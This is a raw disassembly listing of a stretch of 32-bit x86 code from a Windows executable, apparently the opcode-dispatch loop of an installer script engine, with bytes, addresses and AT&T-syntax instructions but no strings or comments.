  4016d9:	ff 75 08             	push   0x8(%ebp)
  4016dc:	e8 8b 45 00 00       	call   0x405c6c
  4016e1:	85 c0                	test   %eax,%eax
  4016e3:	0f 84 ee 0f 00 00    	je     0x4026d7
  4016e9:	ff 75 f8             	push   -0x8(%ebp)
  4016ec:	ff 75 08             	push   0x8(%ebp)
  4016ef:	e8 03 40 00 00       	call   0x4056f7
  4016f4:	6a e4                	push   $0xffffffe4
  4016f6:	e9 ea 0a 00 00       	jmp    0x4021e5
  4016fb:	53                   	push   %ebx
  4016fc:	e8 9c 13 00 00       	call   0x402a9d
  401701:	8b f0                	mov    %eax,%esi
  401703:	8d 45 08             	lea    0x8(%ebp),%eax
  401706:	50                   	push   %eax
  401707:	57                   	push   %edi
  401708:	68 00 04 00 00       	push   $0x400
  40170d:	56                   	push   %esi
  40170e:	ff 15 70 70 40 00    	call   *0x407070
  401714:	85 c0                	test   %eax,%eax
  401716:	74 23                	je     0x40173b
  401718:	8b 45 08             	mov    0x8(%ebp),%eax
  40171b:	3b c6                	cmp    %esi,%eax
  40171d:	76 25                	jbe    0x401744
  40171f:	38 18                	cmp    %bl,(%eax)
  401721:	74 21                	je     0x401744
  401723:	56                   	push   %esi
  401724:	e8 43 45 00 00       	call   0x405c6c
  401729:	3b c3                	cmp    %ebx,%eax
  40172b:	74 0e                	je     0x40173b
  40172d:	83 c0 2c             	add    $0x2c,%eax
  401730:	50                   	push   %eax
  401731:	ff 75 08             	push   0x8(%ebp)
  401734:	e8 6b 42 00 00       	call   0x4059a4
  401739:	eb 09                	jmp    0x401744
  40173b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401742:	88 1f                	mov    %bl,(%edi)
  401744:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401747:	0f 85 e5 11 00 00    	jne    0x402932
  40174d:	68 00 04 00 00       	push   $0x400
  401752:	57                   	push   %edi
  401753:	57                   	push   %edi
  401754:	ff 15 6c 70 40 00    	call   *0x40706c
  40175a:	e9 d3 11 00 00       	jmp    0x402932
  40175f:	6a ff                	push   $0xffffffff
  401761:	e8 37 13 00 00       	call   0x402a9d
  401766:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401769:	51                   	push   %ecx
  40176a:	56                   	push   %esi
  40176b:	68 00 04 00 00       	push   $0x400
  401770:	53                   	push   %ebx
  401771:	50                   	push   %eax
  401772:	53                   	push   %ebx
  401773:	ff 15 68 70 40 00    	call   *0x407068
  401779:	85 c0                	test   %eax,%eax
  40177b:	0f 85 b1 11 00 00    	jne    0x402932
  401781:	e9 25 0f 00 00       	jmp    0x4026ab
  401786:	6a ef                	push   $0xffffffef
  401788:	e8 10 13 00 00       	call   0x402a9d
  40178d:	50                   	push   %eax
  40178e:	56                   	push   %esi
  40178f:	e8 1b 3f 00 00       	call   0x4056af
  401794:	e9 2f fe ff ff       	jmp    0x4015c8
  401799:	6a 31                	push   $0x31
  40179b:	e8 fd 12 00 00       	call   0x402a9d
  4017a0:	8b f0                	mov    %eax,%esi
  4017a2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4017a5:	83 e0 07             	and    $0x7,%eax
  4017a8:	56                   	push   %esi
  4017a9:	89 75 cc             	mov    %esi,-0x34(%ebp)
  4017ac:	89 45 08             	mov    %eax,0x8(%ebp)
  4017af:	e8 55 3d 00 00       	call   0x405509
  4017b4:	85 c0                	test   %eax,%eax
  4017b6:	bf e8 9b 40 00       	mov    $0x409be8,%edi
  4017bb:	56                   	push   %esi
  4017bc:	74 08                	je     0x4017c6
  4017be:	57                   	push   %edi
  4017bf:	e8 e0 41 00 00       	call   0x4059a4
  4017c4:	eb 17                	jmp    0x4017dd
  4017c6:	68 00 58 43 00       	push   $0x435800
  4017cb:	57                   	push   %edi
  4017cc:	e8 d3 41 00 00       	call   0x4059a4
  4017d1:	50                   	push   %eax
  4017d2:	e8 c6 3c 00 00       	call   0x40549d
  4017d7:	50                   	push   %eax
  4017d8:	e8 e3 41 00 00       	call   0x4059c0
  4017dd:	57                   	push   %edi
  4017de:	e8 f0 43 00 00       	call   0x405bd3
  4017e3:	be e8 a3 40 00       	mov    $0x40a3e8,%esi
  4017e8:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017ec:	7c 31                	jl     0x40181f
  4017ee:	57                   	push   %edi
  4017ef:	e8 78 44 00 00       	call   0x405c6c
  4017f4:	33 c9                	xor    %ecx,%ecx
  4017f6:	3b c3                	cmp    %ebx,%eax
  4017f8:	74 10                	je     0x40180a
  4017fa:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4017fd:	83 c0 14             	add    $0x14,%eax
  401800:	51                   	push   %ecx
  401801:	50                   	push   %eax
  401802:	ff 15 64 70 40 00    	call   *0x407064
  401808:	8b c8                	mov    %eax,%ecx
  40180a:	8b 45 08             	mov    0x8(%ebp),%eax
  40180d:	83 c0 fd             	add    $0xfffffffd,%eax
  401810:	0d 00 00 00 80       	or     $0x80000000,%eax
  401815:	23 c1                	and    %ecx,%eax
  401817:	f7 d8                	neg    %eax
  401819:	1b c0                	sbb    %eax,%eax
  40181b:	40                   	inc    %eax
  40181c:	89 45 08             	mov    %eax,0x8(%ebp)
  40181f:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401822:	75 06                	jne    0x40182a
  401824:	57                   	push   %edi
  401825:	e8 37 3e 00 00       	call   0x405661
  40182a:	33 c0                	xor    %eax,%eax
  40182c:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401830:	0f 95 c0             	setne  %al
  401833:	40                   	inc    %eax
  401834:	50                   	push   %eax
  401835:	68 00 00 00 40       	push   $0x40000000
  40183a:	57                   	push   %edi
  40183b:	e8 40 3e 00 00       	call   0x405680
  401840:	83 f8 ff             	cmp    $0xffffffff,%eax
  401843:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401846:	75 76                	jne    0x4018be
  401848:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40184b:	75 53                	jne    0x4018a0
  40184d:	68 00 00 43 00       	push   $0x430000
  401852:	56                   	push   %esi
  401853:	e8 4c 41 00 00       	call   0x4059a4
  401858:	57                   	push   %edi
  401859:	68 00 00 43 00       	push   $0x430000
  40185e:	e8 41 41 00 00       	call   0x4059a4
  401863:	ff 75 f0             	push   -0x10(%ebp)
  401866:	68 e8 9f 40 00       	push   $0x409fe8
  40186b:	e8 56 41 00 00       	call   0x4059c6
  401870:	56                   	push   %esi
  401871:	68 00 00 43 00       	push   $0x430000
  401876:	e8 29 41 00 00       	call   0x4059a4
  40187b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40187e:	c1 f8 03             	sar    $0x3,%eax
  401881:	50                   	push   %eax
  401882:	68 e8 9f 40 00       	push   $0x409fe8
  401887:	e8 0e 3a 00 00       	call   0x40529a
  40188c:	83 e8 04             	sub    $0x4,%eax
  40188f:	0f 84 53 ff ff ff    	je     0x4017e8
  401895:	48                   	dec    %eax
  401896:	74 1b                	je     0x4018b3
  401898:	57                   	push   %edi
  401899:	6a fa                	push   $0xfffffffa
  40189b:	e9 f5 fb ff ff       	jmp    0x401495
  4018a0:	ff 75 cc             	push   -0x34(%ebp)
  4018a3:	6a e2                	push   $0xffffffe2
  4018a5:	e8 bf 34 00 00       	call   0x404d69
  4018aa:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4018ae:	e9 17 fd ff ff       	jmp    0x4015ca
  4018b3:	ff 05 a8 f0 42 00    	incl   0x42f0a8
  4018b9:	e9 7d 10 00 00       	jmp    0x40293b
  4018be:	ff 75 cc             	push   -0x34(%ebp)
  4018c1:	6a ea                	push   $0xffffffea
  4018c3:	e8 a1 34 00 00       	call   0x404d69
  4018c8:	ff 05 8c 92 40 00    	incl   0x40928c
  4018ce:	53                   	push   %ebx
  4018cf:	53                   	push   %ebx
  4018d0:	ff 75 f8             	push   -0x8(%ebp)
  4018d3:	ff 75 e4             	push   -0x1c(%ebp)
  4018d6:	e8 d9 15 00 00       	call   0x402eb4
  4018db:	ff 0d 8c 92 40 00    	decl   0x40928c
  4018e1:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  4018e5:	8b f0                	mov    %eax,%esi
  4018e7:	75 06                	jne    0x4018ef
  4018e9:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  4018ed:	74 12                	je     0x401901
  4018ef:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4018f2:	50                   	push   %eax
  4018f3:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4018f6:	53                   	push   %ebx
  4018f7:	50                   	push   %eax
  4018f8:	ff 75 f8             	push   -0x8(%ebp)
  4018fb:	ff 15 60 70 40 00    	call   *0x407060
  401901:	ff 75 f8             	push   -0x8(%ebp)
  401904:	ff 15 a4 70 40 00    	call   *0x4070a4
  40190a:	3b f3                	cmp    %ebx,%esi
  40190c:	0f 8d 20 10 00 00    	jge    0x402932
  401912:	83 fe fe             	cmp    $0xfffffffe,%esi
  401915:	75 13                	jne    0x40192a
  401917:	6a e9                	push   $0xffffffe9
  401919:	57                   	push   %edi
  40191a:	e8 a7 40 00 00       	call   0x4059c6
  40191f:	ff 75 cc             	push   -0x34(%ebp)
  401922:	57                   	push   %edi
  401923:	e8 98 40 00 00       	call   0x4059c0
  401928:	eb 08                	jmp    0x401932
  40192a:	6a ee                	push   $0xffffffee
  40192c:	57                   	push   %edi
  40192d:	e8 94 40 00 00       	call   0x4059c6
  401932:	68 10 00 20 00       	push   $0x200010
  401937:	57                   	push   %edi
  401938:	e9 4e 09 00 00       	jmp    0x40228b
  40193d:	53                   	push   %ebx
  40193e:	eb 34                	jmp    0x401974
  401940:	6a 31                	push   $0x31
  401942:	e8 56 11 00 00       	call   0x402a9d
  401947:	ff 75 dc             	push   -0x24(%ebp)
  40194a:	50                   	push   %eax
  40194b:	e8 4a 39 00 00       	call   0x40529a
  401950:	3b c3                	cmp    %ebx,%eax
  401952:	0f 84 7f 0d 00 00    	je     0x4026d7
  401958:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  40195b:	0f 84 4a 01 00 00    	je     0x401aab
  401961:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  401964:	0f 85 c8 0f 00 00    	jne    0x402932
  40196a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40196d:	e9 cb 0f 00 00       	jmp    0x40293d
  401972:	6a f0                	push   $0xfffffff0
  401974:	e8 24 11 00 00       	call   0x402a9d
  401979:	ff 75 e0             	push   -0x20(%ebp)
  40197c:	50                   	push   %eax
  40197d:	e8 5a 39 00 00       	call   0x4052dc
  401982:	e9 ab 0f 00 00       	jmp    0x402932
  401987:	6a 01                	push   $0x1
  401989:	e8 0f 11 00 00       	call   0x402a9d
  40198e:	50                   	push   %eax
  40198f:	e8 26 40 00 00       	call   0x4059ba
  401994:	e9 9a 0b 00 00       	jmp    0x402533
  401999:	6a 02                	push   $0x2
  40199b:	e8 e0 10 00 00       	call   0x402a80
  4019a0:	6a 03                	push   $0x3
  4019a2:	89 45 08             	mov    %eax,0x8(%ebp)
  4019a5:	e8 d6 10 00 00       	call   0x402a80
  4019aa:	6a 01                	push   $0x1
  4019ac:	8b f8                	mov    %eax,%edi
  4019ae:	e8 ea 10 00 00       	call   0x402a9d
  4019b3:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4019b6:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4019b9:	88 1e                	mov    %bl,(%esi)
  4019bb:	74 09                	je     0x4019c6
  4019bd:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019c0:	0f 84 6c 0f 00 00    	je     0x402932
  4019c6:	50                   	push   %eax
  4019c7:	e8 ee 3f 00 00       	call   0x4059ba
  4019cc:	3b fb                	cmp    %ebx,%edi
  4019ce:	7d 08                	jge    0x4019d8
  4019d0:	03 f8                	add    %eax,%edi
  4019d2:	0f 88 5a 0f 00 00    	js     0x402932
  4019d8:	3b f8                	cmp    %eax,%edi
  4019da:	7e 02                	jle    0x4019de
  4019dc:	8b f8                	mov    %eax,%edi
  4019de:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4019e1:	03 c7                	add    %edi,%eax
  4019e3:	50                   	push   %eax
  4019e4:	56                   	push   %esi
  4019e5:	e8 ba 3f 00 00       	call   0x4059a4
  4019ea:	8b 7d 08             	mov    0x8(%ebp),%edi
  4019ed:	3b fb                	cmp    %ebx,%edi
  4019ef:	0f 84 3d 0f 00 00    	je     0x402932
  4019f5:	7d 0f                	jge    0x401a06
  4019f7:	56                   	push   %esi
  4019f8:	e8 bd 3f 00 00       	call   0x4059ba
  4019fd:	03 f8                	add    %eax,%edi
  4019ff:	79 05                	jns    0x401a06
  401a01:	89 5d 08             	mov    %ebx,0x8(%ebp)
  401a04:	8b fb                	mov    %ebx,%edi
  401a06:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  401a0c:	0f 8d 20 0f 00 00    	jge    0x402932
  401a12:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  401a15:	e9 18 0f 00 00       	jmp    0x402932
  401a1a:	6a 20                	push   $0x20
  401a1c:	e8 7c 10 00 00       	call   0x402a9d
  401a21:	6a 31                	push   $0x31
  401a23:	8b f0                	mov    %eax,%esi
  401a25:	e8 73 10 00 00       	call   0x402a9d
  401a2a:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  401a2d:	50                   	push   %eax
  401a2e:	56                   	push   %esi
  401a2f:	75 12                	jne    0x401a43
  401a31:	ff 15 e8 70 40 00    	call   *0x4070e8
  401a37:	85 c0                	test   %eax,%eax
  401a39:	75 70                	jne    0x401aab
  401a3b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401a3e:	e9 fa 0e 00 00       	jmp    0x40293d
  401a43:	ff 15 ec 70 40 00    	call   *0x4070ec
  401a49:	eb ec                	jmp    0x401a37
  401a4b:	33 ff                	xor    %edi,%edi
  401a4d:	47                   	inc    %edi
  401a4e:	57                   	push   %edi
  401a4f:	e8 49 10 00 00       	call   0x402a9d
  401a54:	68 00 04 00 00       	push   $0x400
  401a59:	56                   	push   %esi
  401a5a:	50                   	push   %eax
  401a5b:	89 45 08             	mov    %eax,0x8(%ebp)
  401a5e:	ff 15 f0 70 40 00    	call   *0x4070f0
  401a64:	85 c0                	test   %eax,%eax
  401a66:	74 13                	je     0x401a7b
  401a68:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401a6b:	74 13                	je     0x401a80
  401a6d:	56                   	push   %esi
  401a6e:	ff 75 08             	push   0x8(%ebp)
  401a71:	ff 15 ec 70 40 00    	call   *0x4070ec
  401a77:	85 c0                	test   %eax,%eax
  401a79:	75 05                	jne    0x401a80
  401a7b:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a7e:	88 1e                	mov    %bl,(%esi)
  401a80:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  401a86:	e9 a7 0e 00 00       	jmp    0x402932
  401a8b:	53                   	push   %ebx
  401a8c:	e8 ef 0f 00 00       	call   0x402a80
  401a91:	6a 01                	push   $0x1
  401a93:	8b f0                	mov    %eax,%esi
  401a95:	e8 e6 0f 00 00       	call   0x402a80
  401a9a:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  401a9d:	75 08                	jne    0x401aa7
  401a9f:	3b f0                	cmp    %eax,%esi
  401aa1:	7c 08                	jl     0x401aab
  401aa3:	7e 96                	jle    0x401a3b
  401aa5:	eb 0e                	jmp    0x401ab5
  401aa7:	3b f0                	cmp    %eax,%esi
  401aa9:	73 08                	jae    0x401ab3
  401aab:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401aae:	e9 8a 0e 00 00       	jmp    0x40293d
  401ab3:	76 86                	jbe    0x401a3b
  401ab5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401ab8:	e9 80 0e 00 00       	jmp    0x40293d
  401abd:	6a 01                	push   $0x1
  401abf:	e8 bc 0f 00 00       	call   0x402a80
  401ac4:	6a 02                	push   $0x2
  401ac6:	8b f8                	mov    %eax,%edi
  401ac8:	e8 b3 0f 00 00       	call   0x402a80
  401acd:	8b c8                	mov    %eax,%ecx
  401acf:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401ad2:	83 f8 0c             	cmp    $0xc,%eax
  401ad5:	77 6d                	ja     0x401b44
  401ad7:	ff 24 85 4c 2a 40 00 	jmp    *0x402a4c(,%eax,4)
  401ade:	03 f9                	add    %ecx,%edi
  401ae0:	eb 62                	jmp    0x401b44
  401ae2:	2b f9                	sub    %ecx,%edi
  401ae4:	eb 5e                	jmp    0x401b44
  401ae6:	0f af cf             	imul   %edi,%ecx
  401ae9:	8b f9                	mov    %ecx,%edi
  401aeb:	eb 57                	jmp    0x401b44
  401aed:	3b cb                	cmp    %ebx,%ecx
  401aef:	74 42                	je     0x401b33
  401af1:	8b c7                	mov    %edi,%eax
  401af3:	99                   	cltd
  401af4:	f7 f9                	idiv   %ecx
  401af6:	8b f8                	mov    %eax,%edi
  401af8:	eb 4a                	jmp    0x401b44
  401afa:	0b f9                	or     %ecx,%edi
  401afc:	eb 46                	jmp    0x401b44
  401afe:	23 f9                	and    %ecx,%edi
  401b00:	eb 42                	jmp    0x401b44
  401b02:	33 f9                	xor    %ecx,%edi
  401b04:	eb 3e                	jmp    0x401b44
  401b06:	33 c0                	xor    %eax,%eax
  401b08:	3b fb                	cmp    %ebx,%edi
  401b0a:	0f 94 c0             	sete   %al
  401b0d:	eb e7                	jmp    0x401af6
  401b0f:	3b fb                	cmp    %ebx,%edi
  401b11:	75 0e                	jne    0x401b21
  401b13:	eb 08                	jmp    0x401b1d
  401b15:	33 ff                	xor    %edi,%edi
  401b17:	eb 2b                	jmp    0x401b44
  401b19:	3b fb                	cmp    %ebx,%edi
  401b1b:	74 f8                	je     0x401b15
  401b1d:	3b cb                	cmp    %ebx,%ecx
  401b1f:	74 f4                	je     0x401b15
  401b21:	33 ff                	xor    %edi,%edi
  401b23:	47                   	inc    %edi
  401b24:	eb 1e                	jmp    0x401b44
  401b26:	3b cb                	cmp    %ebx,%ecx
  401b28:	74 09                	je     0x401b33
  401b2a:	8b c7                	mov    %edi,%eax
  401b2c:	99                   	cltd
  401b2d:	f7 f9                	idiv   %ecx
  401b2f:	8b fa                	mov    %edx,%edi
  401b31:	eb 11                	jmp    0x401b44
  401b33:	33 ff                	xor    %edi,%edi
  401b35:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b3c:	eb 06                	jmp    0x401b44
  401b3e:	d3 e7                	shl    %cl,%edi
  401b40:	eb 02                	jmp    0x401b44
  401b42:	d3 ff                	sar    %cl,%edi
  401b44:	57                   	push   %edi
  401b45:	e9 37 fa ff ff       	jmp    0x401581
  401b4a:	6a 01                	push   $0x1
  401b4c:	e8 4c 0f 00 00       	call   0x402a9d
  401b51:	6a 02                	push   $0x2
  401b53:	8b f8                	mov    %eax,%edi
  401b55:	e8 26 0f 00 00       	call   0x402a80
  401b5a:	50                   	push   %eax
  401b5b:	57                   	push   %edi
  401b5c:	56                   	push   %esi
  401b5d:	ff 15 54 72 40 00    	call   *0x407254
  401b63:	83 c4 0c             	add    $0xc,%esp
  401b66:	e9 c7 0d 00 00       	jmp    0x402932
  401b6b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401b6e:	8b 3d e8 af 40 00    	mov    0x40afe8,%edi
  401b74:	3b c3                	cmp    %ebx,%eax
  401b76:	74 44                	je     0x401bbc
  401b78:	48                   	dec    %eax
  401b79:	3b fb                	cmp    %ebx,%edi
  401b7b:	0f 84 fc 06 00 00    	je     0x40227d
  401b81:	8b 3f                	mov    (%edi),%edi
  401b83:	3b c3                	cmp    %ebx,%eax
  401b85:	75 f1                	jne    0x401b78
  401b87:	3b fb                	cmp    %ebx,%edi
  401b89:	0f 84 ee 06 00 00    	je     0x40227d
  401b8f:	8d 77 04             	lea    0x4(%edi),%esi
  401b92:	bf e8 9b 40 00       	mov    $0x409be8,%edi
  401b97:	56                   	push   %esi
  401b98:	57                   	push   %edi
  401b99:	e8 06 3e 00 00       	call   0x4059a4
  401b9e:	a1 e8 af 40 00       	mov    0x40afe8,%eax
  401ba3:	83 c0 04             	add    $0x4,%eax
  401ba6:	50                   	push   %eax
  401ba7:	56                   	push   %esi
  401ba8:	e8 f7 3d 00 00       	call   0x4059a4
  401bad:	a1 e8 af 40 00       	mov    0x40afe8,%eax
  401bb2:	57                   	push   %edi
  401bb3:	83 c0 04             	add    $0x4,%eax
  401bb6:	50                   	push   %eax
  401bb7:	e9 9c 0c 00 00       	jmp    0x402858
  401bbc:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401bbf:	74 25                	je     0x401be6
  401bc1:	3b fb                	cmp    %ebx,%edi
  401bc3:	0f 84 0e 0b 00 00    	je     0x4026d7
  401bc9:	8d 47 04             	lea    0x4(%edi),%eax
  401bcc:	50                   	push   %eax
  401bcd:	56                   	push   %esi
  401bce:	e8 d1 3d 00 00       	call   0x4059a4
  401bd3:	8b 07                	mov    (%edi),%eax
  401bd5:	57                   	push   %edi
  401bd6:	a3 e8 af 40 00       	mov    %eax,0x40afe8
  401bdb:	ff 15 f4 70 40 00    	call   *0x4070f4
  401be1:	e9 4c 0d 00 00       	jmp    0x402932
  401be6:	68 04 04 00 00       	push   $0x404
  401beb:	6a 40                	push   $0x40
  401bed:	ff 15 f8 70 40 00    	call   *0x4070f8
  401bf3:	ff 75 dc             	push   -0x24(%ebp)
  401bf6:	8b f0                	mov    %eax,%esi
  401bf8:	8d 46 04             	lea    0x4(%esi),%eax
  401bfb:	50                   	push   %eax
  401bfc:	e8 c5 3d 00 00       	call   0x4059c6
  401c01:	a1 e8 af 40 00       	mov    0x40afe8,%eax
  401c06:	89 06                	mov    %eax,(%esi)
  401c08:	89 35 e8 af 40 00    	mov    %esi,0x40afe8
  401c0e:	e9 1f 0d 00 00       	jmp    0x402932
  401c13:	6a 33                	push   $0x33
  401c15:	e8 83 0e 00 00       	call   0x402a9d
  401c1a:	6a 44                	push   $0x44
  401c1c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c1f:	e8 79 0e 00 00       	call   0x402a9d
  401c24:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  401c28:	89 45 08             	mov    %eax,0x8(%ebp)
  401c2b:	75 0b                	jne    0x401c38
  401c2d:	ff 75 f8             	push   -0x8(%ebp)
  401c30:	e8 e6 3c 00 00       	call   0x40591b
  401c35:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c38:	f6 45 f0 02          	testb  $0x2,-0x10(%ebp)
  401c3c:	75 0b                	jne    0x401c49
  401c3e:	ff 75 08             	push   0x8(%ebp)
  401c41:	e8 d5 3c 00 00       	call   0x40591b
  401c46:	89 45 08             	mov    %eax,0x8(%ebp)
  401c49:	83 7d d8 21          	cmpl   $0x21,-0x28(%ebp)
  401c4d:	6a 01                	push   $0x1
  401c4f:	75 44                	jne    0x401c95
  401c51:	e8 2a 0e 00 00       	call   0x402a80
  401c56:	6a 02                	push   $0x2
  401c58:	8b f8                	mov    %eax,%edi
  401c5a:	e8 21 0e 00 00       	call   0x402a80
  401c5f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401c62:	c1 f9 02             	sar    $0x2,%ecx
  401c65:	74 1e                	je     0x401c85
  401c67:	8d 55 cc             	lea    -0x34(%ebp),%edx
  401c6a:	52                   	push   %edx
  401c6b:	51                   	push   %ecx
  401c6c:	53                   	push   %ebx
  401c6d:	ff 75 08             	push   0x8(%ebp)
  401c70:	ff 75 f8             	push   -0x8(%ebp)
  401c73:	50                   	push   %eax
  401c74:	57                   	push   %edi
  401c75:	ff 15 f8 71 40 00    	call   *0x4071f8
  401c7b:	f7 d8                	neg    %eax
  401c7d:	1b c0                	sbb    %eax,%eax
  401c7f:	40                   	inc    %eax
  401c80:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c83:	eb 3f                	jmp    0x401cc4
  401c85:	ff 75 08             	push   0x8(%ebp)
  401c88:	ff 75 f8             	push   -0x8(%ebp)
  401c8b:	50                   	push   %eax
  401c8c:	57                   	push   %edi
  401c8d:	ff 15 38 72 40 00    	call   *0x407238
  401c93:	eb 2c                	jmp    0x401cc1
  401c95:	e8 03 0e 00 00       	call   0x402a9d
  401c9a:	6a 12                	push   $0x12
  401c9c:	8b f8                	mov    %eax,%edi
  401c9e:	e8 fa 0d 00 00       	call   0x402a9d
  401ca3:	8a 08                	mov    (%eax),%cl
  401ca5:	f6 d9                	neg    %cl
  401ca7:	1b c9                	sbb    %ecx,%ecx
  401ca9:	23 c8                	and    %eax,%ecx
  401cab:	8a 07                	mov    (%edi),%al
  401cad:	f6 d8                	neg    %al
  401caf:	1b c0                	sbb    %eax,%eax
  401cb1:	51                   	push   %ecx
  401cb2:	23 c7                	and    %edi,%eax
  401cb4:	50                   	push   %eax
  401cb5:	ff 75 08             	push   0x8(%ebp)
  401cb8:	ff 75 f8             	push   -0x8(%ebp)
  401cbb:	ff 15 fc 71 40 00    	call   *0x4071fc
  401cc1:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401cc4:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401cc7:	0f 8c 65 0c 00 00    	jl     0x402932
  401ccd:	ff 75 cc             	push   -0x34(%ebp)
  401cd0:	e9 ac f8 ff ff       	jmp    0x401581
  401cd5:	53                   	push   %ebx
  401cd6:	e8 a5 0d 00 00       	call   0x402a80
  401cdb:	50                   	push   %eax
  401cdc:	ff 15 1c 72 40 00    	call   *0x40721c
  401ce2:	85 c0                	test   %eax,%eax
  401ce4:	0f 84 51 fd ff ff    	je     0x401a3b
  401cea:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ced:	e9 4b 0c 00 00       	jmp    0x40293d
  401cf2:	6a 02                	push   $0x2
  401cf4:	e8 87 0d 00 00       	call   0x402a80
  401cf9:	50                   	push   %eax
  401cfa:	6a 01                	push   $0x1
  401cfc:	e8 7f 0d 00 00       	call   0x402a80
  401d01:	50                   	push   %eax
  401d02:	ff 15 20 72 40 00    	call   *0x407220
  401d08:	e9 26 08 00 00       	jmp    0x402533
  401d0d:	a1 68 f0 42 00       	mov    0x42f068,%eax
  401d12:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401d15:	03 c1                	add    %ecx,%eax
  401d17:	50                   	push   %eax
  401d18:	6a eb                	push   $0xffffffeb
  401d1a:	53                   	push   %ebx
  401d1b:	e8 60 0d 00 00       	call   0x402a80
  401d20:	50                   	push   %eax
  401d21:	ff 15 24 72 40 00    	call   *0x407224
  401d27:	e9 06 0c 00 00       	jmp    0x402932
  401d2c:	ff 75 e0             	push   -0x20(%ebp)
  401d2f:	ff 75 f8             	push   -0x8(%ebp)
  401d32:	ff 15 20 72 40 00    	call   *0x407220
  401d38:	8b f0                	mov    %eax,%esi
  401d3a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401d3d:	50                   	push   %eax
  401d3e:	56                   	push   %esi
  401d3f:	ff 15 44 72 40 00    	call   *0x407244
  401d45:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401d48:	6a 10                	push   $0x10
  401d4a:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401d4e:	50                   	push   %eax
  401d4f:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401d52:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401d56:	50                   	push   %eax
  401d57:	53                   	push   %ebx
  401d58:	53                   	push   %ebx
  401d59:	e8 3f 0d 00 00       	call   0x402a9d
  401d5e:	50                   	push   %eax
  401d5f:	53                   	push   %ebx
  401d60:	ff 15 28 72 40 00    	call   *0x407228
  401d66:	50                   	push   %eax
  401d67:	53                   	push   %ebx
  401d68:	68 72 01 00 00       	push   $0x172
  401d6d:	56                   	push   %esi
  401d6e:	ff 15 38 72 40 00    	call   *0x407238
  401d74:	3b c3                	cmp    %ebx,%eax
  401d76:	0f 84 b6 0b 00 00    	je     0x402932
  401d7c:	50                   	push   %eax
  401d7d:	ff 15 44 70 40 00    	call   *0x407044
  401d83:	e9 aa 0b 00 00       	jmp    0x402932
  401d88:	6a 48                	push   $0x48
  401d8a:	6a 5a                	push   $0x5a
  401d8c:	ff 75 f8             	push   -0x8(%ebp)
  401d8f:	ff 15 2c 72 40 00    	call   *0x40722c
  401d95:	50                   	push   %eax
  401d96:	ff 15 40 70 40 00    	call   *0x407040
  401d9c:	50                   	push   %eax
  401d9d:	6a 02                	push   $0x2
  401d9f:	e8 dc 0c 00 00       	call   0x402a80
  401da4:	50                   	push   %eax
  401da5:	ff 15 28 71 40 00    	call   *0x407128
  401dab:	f7 d8                	neg    %eax
  401dad:	6a 03                	push   $0x3
  401daf:	a3 ec af 40 00       	mov    %eax,0x40afec
  401db4:	e8 c7 0c 00 00       	call   0x402a80
  401db9:	a3 fc af 40 00       	mov    %eax,0x40affc
  401dbe:	8a 45 ec             	mov    -0x14(%ebp),%al
  401dc1:	ff 75 e0             	push   -0x20(%ebp)
  401dc4:	8a c8                	mov    %al,%cl
  401dc6:	80 e1 01             	and    $0x1,%cl
  401dc9:	c6 05 03 b0 40 00 01 	movb   $0x1,0x40b003
  401dd0:	88 0d 00 b0 40 00    	mov    %cl,0x40b000
  401dd6:	8a c8                	mov    %al,%cl
  401dd8:	80 e1 02             	and    $0x2,%cl
  401ddb:	24 04                	and    $0x4,%al
  401ddd:	68 08 b0 40 00       	push   $0x40b008
  401de2:	88 0d 01 b0 40 00    	mov    %cl,0x40b001
  401de8:	a2 02 b0 40 00       	mov    %al,0x40b002
  401ded:	e8 d4 3b 00 00       	call   0x4059c6
  401df2:	68 ec af 40 00       	push   $0x40afec
